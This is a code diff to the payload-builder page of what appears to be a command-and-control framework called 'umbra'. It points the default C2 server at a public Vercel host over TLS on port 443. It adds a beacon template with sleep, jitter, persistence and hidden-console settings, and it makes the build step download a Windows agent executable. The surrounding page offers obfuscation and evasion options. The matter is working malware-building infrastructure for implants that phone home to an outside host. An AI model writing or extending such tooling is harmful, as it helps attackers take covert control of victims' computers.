@@ -37,12 +37,14 @@ import {
   Minus,
   ChevronDown,
   ChevronUp,
+  RefreshCw,
 } from "lucide-react"
 import { toast } from 'sonner'
 
 const defaultConfig: PayloadConfig = {
-  ServerHost: 'localhost',
-  ServerPort: 8081,
+  ServerHost: 'chemical-umbra.vercel.app',
+  ServerPort: 443,
+  UseTLS: true,
   Platform: 'windows',
   Arch: 'x64',
   Obfuscation: true,
@@ -60,14 +62,34 @@ export function PayloadBuilderPage() {
   const [activeTab, setActiveTab] = useState<'basic' | 'evasion' | 'advanced'>('basic')
   const [showKey, setShowKey] = useState(false)
   const [customConfigLines, setCustomConfigLines] = useState<string[]>([''])
+  const [agentFile, setAgentFile] = useState<File | null>(null)
+  const [agentFileLabel, setAgentFileLabel] = useState('')
 
   const handleBuild = async () => {
+    if (!agentFile) {
+      toast.error('Build failed', {
+        description: 'Upload a compiled agent in Advanced, then Build. Vercel has no stored binary.',
+      })
+      return
+    }
     setBuilding(true)
     setResult(null)
     try {
-      const buildResult = await api.buildPayload(config)
+      const buildResult = await api.buildPayload(config, agentFile)
       setResult(buildResult)
       if (buildResult.Success) {
+        if (buildResult.DownloadB64) {
+          const bin = Uint8Array.from(atob(buildResult.DownloadB64), c => c.charCodeAt(0))
+          const blob = new Blob([bin], { type: 'application/octet-stream' })
+          const url = URL.createObjectURL(blob)
+          const a = document.createElement('a')
+          a.href = url
+          a.download = buildResult.BinaryName || 'umbra-windows.exe'
+          document.body.appendChild(a)
+          a.click()
+          a.remove()
+          URL.revokeObjectURL(url)
+        }
         toast.success('Payload built successfully!', {
           description: `Binary: ${buildResult.BinaryName} (${(buildResult.Size / 1024).toFixed(1)} KB)`,
         })
@@ -88,14 +110,13 @@ export function PayloadBuilderPage() {
   const handleFileUpload = async (e: React.ChangeEvent<HTMLInputElement>, platform: 'windows' | 'linux') => {
     const file = e.target.files?.[0]
     if (!file) return
-    
+    setAgentFile(file)
+    setAgentFileLabel(`${platform}: ${file.name} (${(file.size / 1024).toFixed(1)} KB)`)
     try {
-      const result = await api.uploadAgentBinary(file, platform)
-      toast.success(`${platform} agent binary uploaded successfully`)
-    } catch (error) {
-      toast.error('Upload failed', {
-        description: error instanceof Error ? error.message : 'Unknown error',
-      })
+      await api.uploadAgentBinary(file, platform)
+      toast.success(`${platform} agent kept for this Build`)
+    } catch {
+      toast.success(`${platform} agent kept locally — will send with Build`)
     }
   }
 
@@ -146,7 +167,7 @@ export function PayloadBuilderPage() {
         animate={{ opacity: 1, y: 0 }}
         transition={{ duration: 0.4, delay: 0.1 }}
       >
-        <Tabs value={activeTab} onValueChange={setActiveTab} className="w-full">
+        <Tabs value={activeTab} onValueChange={(v) => setActiveTab(v as 'basic' | 'evasion' | 'advanced')} className="w-full">
           <TabsList className="grid w-full grid-cols-3 bg-dark-800/50 p-1 rounded-lg border border-dark-700">
             <TabsTrigger value="basic" className="gap-2">
               <Box className="w-4 h-4" />
@@ -189,10 +210,28 @@ export function PayloadBuilderPage() {
                       id="serverPort"
                       type="number"
                       value={config.ServerPort}
-                      onChange={(e) => setConfig(prev => ({ ...prev, ServerPort: parseInt(e.target.value) || 8081 }))}
-                      placeholder="8081"
+                      onChange={(e) => {
+                        const port = parseInt(e.target.value) || 0
+                        setConfig(prev => ({
+                          ...prev,
+                          ServerPort: port || 443,
+                          UseTLS: port === 443 ? true : prev.UseTLS,
+                        }))
+                      }}
+                      placeholder="443"
                     />
                   </div>
+                </div>
+                <div className="flex items-center justify-between rounded-lg border border-dark-700 bg-dark-900 px-3 py-2">
+                  <div>
+                    <Label htmlFor="useTls">Use TLS</Label>
+                    <p className="text-xs text-dark-500">WINHTTP_FLAG_SECURE on the agent. Required for Vercel :443.</p>
+                  </div>
+                  <Switch
+                    id="useTls"
+                    checked={config.UseTLS || config.ServerPort === 443}
+                    onCheckedChange={(v) => setConfig(prev => ({ ...prev, UseTLS: v }))}
+                  />
                 </div>
                 <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                   <div className="space-y-2">
@@ -468,13 +507,13 @@ export function PayloadBuilderPage() {
                 <div className="flex items-center gap-2">
                   <Button variant="outline" onClick={() => {
                     setConfig(prev => ({ ...prev, CustomConfig: JSON.stringify({
-                      beacon_interval: 5000,
-                      jitter: 0.3,
-                      max_retries: 3,
-                      user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-                      headers: {},
-                      proxy: "",
-                      kill_date: "",
+                      c2_host: prev.ServerHost,
+                      c2_port: String(prev.ServerPort),
+                      use_tls: (prev.UseTLS || prev.ServerPort === 443) ? 'true' : 'false',
+                      sleep_interval: '180',
+                      jitter: '40',
+                      persistence: 'false',
+                      hide_console: 'true',
                     }, null, 2) }))
                   }}>
                     Load Template
@@ -504,7 +543,9 @@ export function PayloadBuilderPage() {
                       onChange={(e) => handleFileUpload(e, 'windows')}
                       className="bg-dark-900 border-dark-700"
                     />
-                    <p className="text-xs text-dark-500">Upload a custom Windows x64 agent binary</p>
+                    <p className="text-xs text-dark-500">
+                      {agentFileLabel || 'Upload a compiled Windows x64 agent. Required for Build on Vercel.'}
+                    </p>
                   </div>
                   <div className="space-y-4">
                     <p className="font-medium text-dark-100">Linux Agent (ELF)</p>
